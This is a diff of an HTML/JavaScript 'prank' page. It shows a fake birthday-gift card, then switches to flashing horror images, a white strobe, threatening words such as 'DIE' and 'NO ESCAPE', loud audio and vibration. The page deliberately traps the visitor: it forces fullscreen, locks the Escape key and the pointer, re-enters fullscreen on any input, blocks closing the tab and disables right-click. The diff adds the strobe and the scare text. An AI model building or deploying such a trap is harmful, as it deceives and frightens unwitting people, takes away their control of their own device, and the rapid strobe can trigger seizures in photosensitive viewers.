@@ -31,7 +31,6 @@
             left: 0;
             width: 100%;
             height: 100%;
-            /* Modern Mesh Gradient Background */
             background: radial-gradient(at top left, #a8c0ff, transparent),
                         radial-gradient(at bottom right, #3f2b96, transparent),
                         linear-gradient(to bottom right, #ff9a9e, #fad0c4);
@@ -44,48 +43,31 @@
             overflow: hidden;
         }
 
-        /* Animated Background Orbs for Glass Effect */
         .orb {
             position: absolute;
             border-radius: 50%;
             filter: blur(60px);
             opacity: 0.8;
-            z-index: 101; /* Behind card */
+            z-index: 101;
             animation: floatOrb 10s infinite ease-in-out;
         }
 
-        .orb-1 {
-            width: 300px;
-            height: 300px;
-            background: #8ec5fc;
-            top: -50px;
-            left: -50px;
-            animation-delay: 0s;
-        }
-
-        .orb-2 {
-            width: 400px;
-            height: 400px;
-            background: #e0c3fc;
-            bottom: -100px;
-            right: -100px;
-            animation-delay: -5s;
-        }
+        .orb-1 { width: 300px; height: 300px; background: #8ec5fc; top: -50px; left: -50px; }
+        .orb-2 { width: 400px; height: 400px; background: #e0c3fc; bottom: -100px; right: -100px; animation-delay: -5s; }
 
         @keyframes floatOrb {
             0%, 100% { transform: translate(0, 0) scale(1); }
             50% { transform: translate(30px, -30px) scale(1.1); }
         }
 
-        /* The Glass Card */
         .card {
-            background: rgba(255, 255, 255, 0.2); /* Semi-transparent white */
-            backdrop-filter: blur(25px);         /* The Frost Effect */
-            -webkit-backdrop-filter: blur(25px); /* Safari support */
-            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle white border */
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
             padding: 50px 40px;
             border-radius: 30px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2); /* Soft shadow for depth */
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
             text-align: center;
             max-width: 90%;
             width: 450px;
@@ -99,7 +81,6 @@
             margin-bottom: 15px;
             font-weight: 700;
             text-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            letter-spacing: -1px;
         }
 
         .card p {
@@ -110,7 +91,6 @@
             font-weight: 500;
         }
 
-        /* Glassy Button */
         .btn-surprise {
             background: rgba(255, 255, 255, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.5);
@@ -122,27 +102,15 @@
             cursor: pointer;
             backdrop-filter: blur(5px);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            transition: all 0.3s;
             outline: none;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
-        .btn-surprise:hover {
-            background: rgba(255, 255, 255, 0.5);
-            transform: translateY(-3px);
-            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.15);
-        }
-
-        .btn-surprise:active {
-            transform: scale(0.95);
-        }
-        
-        .btn-surprise:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
+        .btn-surprise:hover { transform: translateY(-3px); background: rgba(255, 255, 255, 0.5); }
+        .btn-surprise:active { transform: scale(0.95); }
+        .btn-surprise:disabled { opacity: 0.6; cursor: not-allowed; }
 
         .loading-text {
             margin-top: 20px;
@@ -150,11 +118,8 @@
             color: rgba(255, 255, 255, 0.7);
             opacity: 0;
             transition: opacity 0.3s;
-            font-weight: 500;
-            letter-spacing: 0.5px;
         }
 
-        /* Simple Confetti */
         .confetti {
             position: absolute;
             width: 10px;
@@ -165,12 +130,10 @@
             opacity: 0.8;
         }
 
-        @keyframes fall {
-            to { transform: translateY(100vh) rotate(720deg); }
-        }
+        @keyframes fall { to { transform: translateY(100vh) rotate(720deg); } }
 
         /* =========================================
-           LAYER 2: THE CHAOS "SWITCH" UI
+           LAYER 2: CHAOS & HORROR LAYERS
            ========================================= */
         #chaos-layer {
             position: fixed;
@@ -179,8 +142,8 @@
             width: 100%;
             height: 100%;
             background: #000;
-            z-index: 1; /* Behind innocent layer initially */
-            display: none; /* Hidden until triggered */
+            z-index: 1;
+            display: none;
         }
 
         .loop-img {
@@ -192,12 +155,43 @@
             object-fit: cover;
             display: none;
         }
+        .loop-img.active { display: block; }
 
-        .loop-img.active {
-            display: block;
+        /* NEW: STROBE LAYER */
+        #strobe-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 5;
+            opacity: 0;
+            pointer-events: none;
+            display: none;
+        }
+        @keyframes strobe-anim {
+            0% { opacity: 0; }
+            50% { opacity: 0.15; }
+            100% { opacity: 0; }
         }
 
-        /* The Trap Net (Invisible overlay to catch clicks if they escape fullscreen) */
+        /* NEW: GLITCH TEXT LAYER */
+        #glitch-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+            z-index: 6;
+            pointer-events: none;
+            display: none;
+            white-space: nowrap;
+            text-shadow: 4px 4px 0 #000;
+        }
+
         #trap-net {
             position: fixed;
             top: 0;
@@ -213,18 +207,14 @@
 </head>
 <body>
 
-    <!-- AUDIO SOURCE (Hidden) -->
-    <!-- Ensure your file is named music.mp3 -->
     <audio id="bg-audio" loop>
         <source src="music.mp3" type="audio/mpeg">
     </audio>
 
-    <!-- INNOCENT UI (GLASSMORPHISM) -->
+    <!-- INNOCENT UI -->
     <div id="innocent-layer">
-        <!-- Floating Orbs for effect -->
         <div class="orb orb-1"></div>
         <div class="orb orb-2"></div>
-        
         <div class="card">
             <h1>Surprise! 🎉</h1>
             <p>I've prepared a special digital gift for you.<br>Please ensure your volume is ON. 🔊</p>
@@ -233,25 +223,27 @@
         </div>
     </div>
 
-    <!-- CHAOS UI -->
-    <div id="chaos-layer">
-        <!-- Images injected here -->
-    </div>
-
-    <!-- TRAP NET -->
+    <!-- HORROR UI -->
+    <div id="chaos-layer"></div>
+    <div id="strobe-layer"></div>
+    <div id="glitch-text"></div>
     <div id="trap-net"></div>
 
     <script>
-        // --- CONFIGURATION ---
+        // CONFIGURATION
         const CONFIG = {
-            imageCount: 15,          // 1.jpg to 15.jpg
-            loopSpeed: 50,           // 50ms = 20 frames per second (Very Fast)
+            imageCount: 15,          
+            loopSpeed: 50,           
             fileExt: '.jpg'
         };
 
-        // --- ELEMENTS ---
+        const CREEPY_WORDS = ["I SEE YOU", "RUN", "HELP", "DIE", "LOOK BEHIND YOU", "666", "ERROR", "NO ESCAPE", "WAKE UP"];
+
+        // ELEMENTS
         const innocentLayer = document.getElementById('innocent-layer');
         const chaosLayer = document.getElementById('chaos-layer');
+        const strobeLayer = document.getElementById('strobe-layer');
+        const glitchText = document.getElementById('glitch-text');
         const triggerBtn = document.getElementById('trigger-btn');
         const loadStatus = document.getElementById('load-status');
         const chaosContainer = document.getElementById('chaos-layer');
@@ -263,25 +255,14 @@
         let activeIndex = 0;
         let isPrankActive = false;
 
-        // --- 1. SETUP: PRELOAD ASSETS SILENTLY ---
-        // We load the scary images while they are looking at the cute birthday card.
         function preloadImages() {
             loadStatus.style.opacity = '1';
-            
             for(let i=1; i <= CONFIG.imageCount; i++) {
                 const img = new Image();
                 img.src = `${i}${CONFIG.fileExt}`;
                 img.className = 'loop-img';
-                
-                img.onload = () => {
-                    loaded++;
-                    checkLoad();
-                };
-                img.onerror = () => {
-                    loaded++; // Proceed anyway
-                    checkLoad();
-                };
-
+                img.onload = () => { loaded++; checkLoad(); };
+                img.onerror = () => { loaded++; checkLoad(); };
                 images.push(img);
                 chaosContainer.appendChild(img);
             }
@@ -295,101 +276,83 @@
             }
         }
 
-        // --- 2. THE TRIGGER ---
         triggerBtn.addEventListener('click', () => {
             isPrankActive = true;
-
-            // A. Switch UI Instantly
             innocentLayer.style.display = 'none';
             chaosLayer.style.display = 'block';
             trapNet.style.display = 'block';
+            
+            // Activate Strobe & Glitch Text
+            strobeLayer.style.display = 'block';
+            strobeLayer.style.animation = 'strobe-anim 0.1s infinite';
+            glitchText.style.display = 'block';
 
-            // B. Fullscreen & Lock
             forceFullscreen();
-
-            // C. Audio
             audio.volume = 1.0;
             audio.play();
-
-            // D. Start Loop
             startChaosLoop();
         });
 
-        // --- 3. THE LOOP ---
         function startChaosLoop() {
             setInterval(() => {
-                // Hide current
+                // 1. Image Loop
                 images[activeIndex].classList.remove('active');
-                
-                // Increment
                 activeIndex++;
                 if(activeIndex >= images.length) activeIndex = 0;
-                
-                // Show next
                 images[activeIndex].classList.add('active');
+
+                // 2. Vibration (Mobile Only)
+                if (navigator.vibrate) navigator.vibrate(50);
+
+                // 3. Random Glitch Text
+                if (Math.random() > 0.6) {
+                    glitchText.innerText = CREEPY_WORDS[Math.floor(Math.random() * CREEPY_WORDS.length)];
+                    glitchText.style.fontSize = (Math.random() * 5 + 3) + 'rem';
+                    glitchText.style.color = Math.random() > 0.5 ? '#ff0000' : '#ffffff';
+                    
+                    // Random Position
+                    const randX = Math.floor(Math.random() * 80) + 10;
+                    const randY = Math.floor(Math.random() * 80) + 10;
+                    glitchText.style.left = randX + '%';
+                    glitchText.style.top = randY + '%';
+                }
+
             }, CONFIG.loopSpeed);
         }
 
-        // --- 4. AGGRESSIVE FULLSCREEN TRAP LOGIC ---
         async function forceFullscreen() {
             const doc = document.documentElement;
-            
-            // 1. Try Fullscreen
             try {
                 if (doc.requestFullscreen) await doc.requestFullscreen();
                 else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
-            } catch(e) {
-                console.log("FS Blocked");
-            }
+            } catch(e) {}
             
-            // 2. Try Keyboard Lock (The "Anti-Escape" mechanic)
-            // This prevents ESC from exiting fullscreen in Chrome/Edge on Desktop
             try {
                 if (navigator.keyboard && navigator.keyboard.lock) {
                     await navigator.keyboard.lock(['Escape']);
-                    console.log("Keyboard Locked");
                 }
-            } catch(e) {
-                console.log("Lock Failed");
-            }
-
-            // 3. Try Pointer Lock (Hides cursor and locks it to window)
-            try {
-                document.body.requestPointerLock();
             } catch(e) {}
+
+            try { document.body.requestPointerLock(); } catch(e) {}
         }
 
-        // Monitor if they press ESC (If keyboard lock fails)
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement && isPrankActive) {
-                // They escaped!
-                // 1. Keep playing audio
                 audio.play();
-                
-                // 2. IMMEDIATE RE-ENTRY ATTEMPT
                 forceFullscreen();
             }
         });
 
-        // 3. MULTI-VECTOR TRAP: ANY INTERACTION RE-TRIGGERS
-        // If the auto-re-entry failed, this catches them instantly on next input
         ['click', 'mousemove', 'mousedown', 'touchstart', 'keydown', 'resize', 'focus'].forEach(evt => {
             window.addEventListener(evt, () => {
-                if(isPrankActive && !document.fullscreenElement) {
-                    forceFullscreen();
-                }
+                if(isPrankActive && !document.fullscreenElement) forceFullscreen();
             });
         });
 
-        // 4. PREVENT TAB CLOSING
         window.onbeforeunload = function() {
-            if(isPrankActive) {
-                return "Are you sure you want to leave?";
-            }
+            if(isPrankActive) return "Are you sure you want to leave?";
         };
 
-        // --- 5. VISUAL FLUFF (Confetti) ---
-        // Makes the bait look real
         function createConfetti() {
             const colors = ['#fff', '#f0f', '#0ff', '#ff0'];
             const conf = document.createElement('div');
@@ -398,18 +361,11 @@
             conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
             conf.style.animationDuration = (Math.random() * 3 + 2) + 's';
             innocentLayer.appendChild(conf);
-
-            // Remove after animation
             setTimeout(() => conf.remove(), 5000);
         }
-        
-        // Spawn confetti every 300ms
         setInterval(createConfetti, 300);
 
-        // Start
         preloadImages();
-
-        // Prevent Right Click (Context Menu)
         document.addEventListener('contextmenu', event => event.preventDefault());
 
     </script>
